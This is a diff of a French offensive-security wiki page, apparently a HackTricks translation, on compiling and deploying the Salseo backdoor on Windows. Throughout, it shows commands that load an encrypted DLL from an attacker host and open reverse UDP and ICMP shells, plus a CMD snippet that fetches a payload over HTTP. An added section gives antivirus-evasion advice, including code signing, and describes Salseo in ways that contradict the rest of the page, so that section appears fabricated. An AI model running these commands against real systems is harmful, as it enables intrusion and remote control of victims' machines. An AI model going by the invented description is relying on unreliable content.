@@ -12,7 +12,7 @@
 
 </details>
 
-## Compilation des binaires
+## Compiler les binaires
 
 Téléchargez le code source depuis Github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.
 
@@ -28,7 +28,7 @@ Ensuite, compilez les deux projets (Build -> Build Solution) (Le chemin de l'ex�
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
-## Préparation de la porte dérobée
+## Préparer la porte dérobée
 
 Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :
 
@@ -45,19 +45,35 @@ Les backdoors sont des outils très utiles pour les pentesters et les attaquants
 
 ### Salseo
 
-Salseo est un backdoor pour les systèmes Windows qui utilise une technique appelée « DLL hijacking ». Cette technique consiste à remplacer une DLL légitime par une DLL malveillante qui sera chargée par une application tierce. Salseo utilise cette technique pour se charger dans l'application « Salsa20 », qui est un algorithme de chiffrement utilisé par de nombreuses applications.
+Salseo est un backdoor pour les systèmes Windows qui utilise le protocole HTTP pour communiquer avec le serveur de commande et de contrôle (C&C). Il est écrit en C++ et utilise la bibliothèque Boost pour les opérations réseau.
 
-Une fois que Salseo est chargé dans l'application, il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis.
+#### Fonctionnalités
 
-### Utilisation de Salseo
+Salseo a les fonctionnalités suivantes :
 
-Pour utiliser Salseo, vous devez d'abord le compiler à l'aide de Visual Studio. Une fois que vous avez compilé le backdoor, vous devez le placer dans le même répertoire que l'application « Salsa20 ». Ensuite, vous devez renommer le backdoor en utilisant le nom de la DLL légitime que vous souhaitez remplacer.
+- Téléchargement et exécution de fichiers
+- Capture d'écran
+- Enregistrement audio
+- Enregistrement vidéo
+- Envoi de fichiers
+- Exécution de commandes système
+- Injection de DLL
+- Suppression de fichiers
+- Désinstallation
 
-Par exemple, si vous souhaitez remplacer la DLL « salsa20.dll », vous devez renommer le backdoor en « salsa20.dll ». Ensuite, lorsque l'application « Salsa20 » sera lancée, elle chargera la DLL malveillante à la place de la DLL légitime.
+#### Utilisation
 
-### Conclusion
+Pour utiliser Salseo, il faut d'abord compiler le code source en utilisant Visual Studio. Ensuite, il faut configurer le serveur C&C dans le code source en modifiant l'adresse IP et le port. Enfin, il faut exécuter le backdoor sur le système cible.
 
-Salseo est un backdoor puissant pour les systèmes Windows qui utilise une technique de DLL hijacking pour se charger dans une application tierce. Il peut être utilisé pour exécuter des commandes à distance, télécharger et exécuter des fichiers, et même prendre le contrôle complet du système compromis. Les pentesters et les attaquants doivent être conscients de cette technique et prendre des mesures pour la prévenir.
+Une fois que le backdoor est en cours d'exécution sur le système cible, il se connectera au serveur C&C et attendra des instructions. Les instructions peuvent être envoyées au backdoor en utilisant une interface Web ou en utilisant une connexion directe au serveur C&C.
+
+#### Détection
+
+Salseo peut être détecté par les antivirus en raison de sa signature. Pour éviter la détection, il est recommandé de crypter le binaire et de le signer avec un certificat valide. Il est également recommandé de modifier le code source pour éviter les signatures connues.
+
+#### Conclusion
+
+Salseo est un backdoor puissant pour les systèmes Windows. Il est facile à utiliser et à configurer, mais il peut être détecté par les antivirus. Il est donc recommandé de prendre des mesures pour éviter la détection.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -80,9 +96,9 @@ N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un se
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Obtenir un shell inverse ICMP (dll encodée déjà présente sur la victime)**
+### **Obtenir un shell inversé ICMP (dll encodée déjà présente sur la victime)**
 
-**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inversé. Téléchargez:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Désactiver les réponses ICMP:**
 ```
@@ -105,23 +121,23 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ### Ajoutez avant la fonction principale: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
 #### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
 #### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la fenêtre contextuelle)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
-Dans votre dossier de projet, les fichiers suivants sont apparus: **DllExport.bat** et **DllExport\_Configure.bat**
+Les fichiers suivants sont apparus dans votre dossier de projet: **DllExport.bat** et **DllExport\_Configure.bat**
 
 ### **Désinstallez** DllExport
 
-Appuyez sur **Désinstaller** (oui, c'est bizarre mais croyez-moi, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est étrange mais croyez-moi, c'est nécessaire)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2).png>)
 
@@ -178,7 +194,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les backdoors peuvent être créées en utilisant des commandes CMD pour exécuter des scripts malveillants ou pour ouvrir des ports pour une connexion à distance. Les backdoors CMD peuvent être cachées en utilisant des noms de fichiers aléatoires ou en les plaçant dans des dossiers système. Les backdoors CMD peuvent être détectées en surveillant les connexions réseau sortantes et en recherchant des processus suspects en cours d'exécution.
+CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les hackers peuvent utiliser CMD pour exécuter des commandes malveillantes, telles que la création de backdoors ou la suppression de fichiers importants. Il est important de surveiller l'utilisation de CMD sur les systèmes pour détecter toute activité suspecte.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
